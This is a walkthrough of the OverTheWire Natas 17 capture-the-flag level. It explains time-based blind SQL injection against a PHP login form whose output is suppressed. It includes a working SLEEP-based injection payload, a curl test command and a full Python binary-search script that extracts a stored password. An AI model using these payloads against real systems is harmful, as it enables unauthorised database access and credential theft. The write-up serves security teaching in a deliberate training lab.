> **Level Goal:** Find the password for the next level.

---

## Connection Details

| Field    | Value                                                        |
| -------- | ------------------------------------------------------------ |
| URL      | `http://natas17.natas.labs.overthewire.org`                  |
| Username | `natas17`                                                    |
| Password | *found in [Natas Level 15 → 16](natas-level-15-level-16.md)* |

---

## Tools Used

- A web browser
- **View sourcecode** — the page links to its own PHP source
- **Python** — to automate blind extraction through timing

---

## Solution

### Step 1 — Open the URL

Navigate to `http://natas17.natas.labs.overthewire.org` and log in with the password from Level 16.

The page looks identical to Level 15 — a single **Username** field — but every response is blank. Click **View sourcecode**.

---

### Step 2 — Read the Source Code

```php
<?php
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            //echo "This user exists.<br>";
        } else {
            //echo "This user doesn't exist.<br>";
        }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
}
?>
```

The injection point is identical to Level 15 — unsanitised concatenation into `$query`. The only difference: every `echo` is commented out. The query executes, but the result is silently discarded. The server always returns a blank body.

The boolean channel from Level 15 is gone. The injection point is not.

---

### Understand Time-Based Blind SQL Injection

With no output to read, time becomes the signal. MySQL's `SLEEP(n)` pauses execution for `n` seconds. Combined with `IF()`:

```sql
IF(condition, SLEEP(2), 0)
```

- Condition true → database sleeps 2 seconds → HTTP response is slow
- Condition false → response returns immediately

Measure elapsed time in Python. Slow means true, fast means false.

The payload structure is the same as Level 15 — `ORD(SUBSTRING(password, position, 1))` — wrapped in the timing construct:

```sql
natas18" AND IF(ORD(SUBSTRING(password,1,1)) > 97, SLEEP(2), 0) -- -
```

**Why `natas18` as the anchor, not `natas17`?** MySQL short-circuits `AND`: if `WHERE username="X"` matches no rows, the right side never evaluates and `SLEEP()` never runs. The table stores the _next_ level's credentials, so `natas18` is the row that exists here.

---

### Optimise: Binary Search Over the Charset

Linear search (Level 15's approach) asks up to 62 questions per character — one per candidate. On a sleep-based channel, each "hit" costs 2 seconds, making worst-case extraction (~992 hits across 32 characters) take over 30 minutes.

Binary search asks at most `⌈log₂(62)⌉ = 6` questions per character using `>` comparisons to halve the search space each step. Total requests drop from ~1984 to ~192.

**The charset is not a contiguous ordinal range.** `[a-z, A-Z, 0-9]` spans three separate ranges: `48–57`, `65–90`, `97–122`. Searching over raw integers 48–122 allows midpoints to land in gaps (`:`, `@`, `` ` ``), causing the search to converge on characters that cannot appear in the password.

The fix: build a sorted list of the 62 valid ordinals and search over indices into that list.

```python
CHARSET = sorted(
    list(range(ord('a'), ord('z') + 1)) +
    list(range(ord('A'), ord('Z') + 1)) +
    list(range(ord('0'), ord('9') + 1))
)
# 62 elements, no gaps
```

Binary search then runs over indices `0–61`. `CHARSET[mid_idx]` gives the ordinal to put in the SQL comparison. Every midpoint is a valid charset character.

---

### Step 3 — Confirm the Channel

Verify the anchor username fires the sleep:

```bash
time curl -u natas17:<password> \
     "http://natas17.natas.labs.overthewire.org/index.php" \
     --data 'username=natas18" AND IF(1=1, SLEEP(2), 0) -- -'
```

Expected: ~2 seconds. If it returns instantly, the anchor username is wrong, the `AND` short-circuited.

---

### Step 4 — Automate the Extraction

```python
import requests
import time
from requests.auth import HTTPBasicAuth

url   = "http://natas17.natas.labs.overthewire.org/index.php"
auth  = HTTPBasicAuth("natas17", "<password>")  # HTTP Basic Auth to the web server

SLEEP_SECONDS = 2    # how long MySQL sleeps when the condition is true
THRESHOLD     = 1.0  # responses above this are classified as "slow" (condition true)
 # set it halfway between baseline latency and SLEEP_SECONDS

# Build a sorted list of the 62 valid ordinals: a-z (97-122), A-Z (65-90), 0-9 (48-57)
# We search over indices into this list, not raw integers.
# Raw range 48-122 includes gap characters like ':', '@', '`' that can't appear in
# the password — a midpoint landing there causes the search to converge on the wrong char.
CHARSET = sorted(
    list(range(ord('a'), ord('z') + 1)) +
    list(range(ord('A'), ord('Z') + 1)) +
    list(range(ord('0'), ord('9') + 1))
)

password = ""

for position in range(1, 33):  # MySQL SUBSTRING is 1-based; password is 32 chars
    low  = 0
    high = len(CHARSET) - 1    # binary search bounds are indices, not ordinals

    while low < high:
        mid_idx = (low + high) // 2
        mid_ord = CHARSET[mid_idx]  # the actual ASCII value to compare against in SQL

        # Ask: is the character at `position` greater than `mid_ord`?
        # Natas18 is the anchor — it must exist in the table or AND short-circuits
        # and SLEEP() never runs, making every response look like "false"
        payload = (
            f'natas18" AND IF('
            f'ORD(SUBSTRING(password,{position},1)) > {mid_ord},'
            f'SLEEP({SLEEP_SECONDS}), 0) -- -'
        )

        start   = time.time()
        requests.post(url, auth=auth, data={"username": payload})
        elapsed = time.time() - start

        if elapsed > THRESHOLD:
            low = mid_idx + 1  # slow: condition true → character is above mid_ord
        else:
            high = mid_idx     # fast: condition false → character is at or below mid_ord

    # low == high: the index has converged on exactly one character
    found_ord  = CHARSET[low]
    found_char = chr(found_ord)
    password  += found_char
    print(f"[{position:02d}] ord={found_ord} '{found_char}' → {password}")

print(f"\nPassword: {password}")
```

```bash
python3 natas17.py
```

Output:

```
[01] ord=54 '6' → 6
[02] ord=79 'O' → 6O
[03] ord=71 'G' → 6OG
...
[32] ord=74 'J' → <password>

Password: <password>
```

That is the password for [Natas Level 17 → 18](natas-level-17-level-18.md).

---

## Key Takeaways

- **Suppressing output does not fix injection.** The root vulnerability is identical to Level 15. Commenting out `echo` removes the boolean channel; it does not prevent the query from executing or the attacker's payload from running.
- **Time is an unblockable side channel.** The server cannot respond before the database finishes. `SLEEP()` makes that delay conditional on a SQL predicate, turning execution time into a one-bit signal per request.
- **The SQL anchor must match an existing row.** If `WHERE username="X"` finds nothing, `AND` short-circuits and `SLEEP()` never runs. All responses look identical to "false" — the extraction silently produces garbage.
- **Binary search over a charset list, not a raw ordinal range.** The valid charset has gaps in its ASCII range. Searching raw integers allows convergence on gap characters. Searching indices into a pre-built list of valid ordinals eliminates the problem entirely.

---
